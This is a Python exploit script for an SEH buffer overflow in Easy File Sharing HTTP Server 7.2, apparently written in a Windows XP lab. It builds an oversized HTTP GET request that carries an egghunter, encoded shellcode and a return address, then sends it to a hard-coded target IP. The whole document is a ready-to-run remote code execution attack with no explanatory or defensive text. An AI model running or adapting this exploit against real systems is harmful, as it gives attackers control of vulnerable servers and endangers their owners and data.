# Easy File Sharing HTTP Server 7.2 SEH Overflow
# Tested on: Windows XP Professional SP3 x86

import socket

host = '192.168.219.161'
port = 80

# Bad Chars Identified \x00 \x20 \x25 \x2B \x2F \x5C 
# POP POP RETN 1001a459

egghunter =  ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" 
egghunter += "\xef\xb8\x6e\x69\x6a\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" 

shellcode =  ""
shellcode += "\xd9\xeb\xba\xd0\x5d\xec\xf7\xd9\x74\x24\xf4\x5f"
shellcode += "\x31\xc9\xb1\x1f\x83\xef\xfc\x31\x57\x13\x03\x87"
shellcode += "\x4e\x0e\x02\x9d\x8a\xf4\x07\x3a\xb6\xd3\x01\xc8"
shellcode += "\x63\x10\xee\x01\xa5\x69\x09\x50\x62\x99\xa9\x55"
shellcode += "\x88\x9e\xfa\xad\x49\xbf\x23\x76\xac\x44\x78\xf0"
shellcode += "\xf8\x8a\x5b\x72\x5a\x94\x1c\x73\x3d\x3e\xef\x46"
shellcode += "\x56\x47\x6d\x9e\xdd\x23\x3d\xd5\x3b\x08\xfc\x6d"
shellcode += "\x10\xf2\xde\xbc\xb6\xfd\x99\x97\x15\x16\xec\x9a"
shellcode += "\xc7\xe2\x59\xf0\x3f\x57\x48\x9f\x9f\x99\xbf\x04"
shellcode += "\xd1\x1a\x50\x70\x2c\x89\x2d\x89\x1b\x41\xb3\x4c"
shellcode += "\x9c\x1d\x0a\x1b\x07\x24\xa5\x64\xdc\xd4\xa7\x64"
shellcode += "\x19\x8a\x15\x64\x73\x2c\xd1\xd9\xb1\x8b\xc7\xdb"
shellcode += "\x29\xac\x26"

payload = 'njpwn' * 100 + 'nijonijo' + shellcode + '\x90\x90' + 'nj' + 'njoffsec' * 425 + 'nj' + '\x90\x90\xeb\x05' + '\x59\xa4\x01\x10' + '\x90\x90\x90\x90\x90' + egghunter + '\x90\x90' + 'nj' + 'njoffsec' * 361 + 'nj'

evilrequest = "GET /" + payload + " HTTP/1.1" + "\r\n"
evilrequest += "Host: " + host + "\r\n"
evilrequest += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" + "\r\n"
evilrequest += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
evilrequest += "Accept-Language: en-US,en;q=0.5" + "\r\n"
evilrequest += "Accept-Encoding: gzip, deflate" + "\r\n"
evilrequest += "DNT: 1" + "\r\n"
evilrequest += "Connection: close" + "\r\n"
evilrequest += "Upgrade-Insecure-Requests: 1" + "\r\n\r\n"

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((host,port))
socket.send(evilrequest)
socket.close()
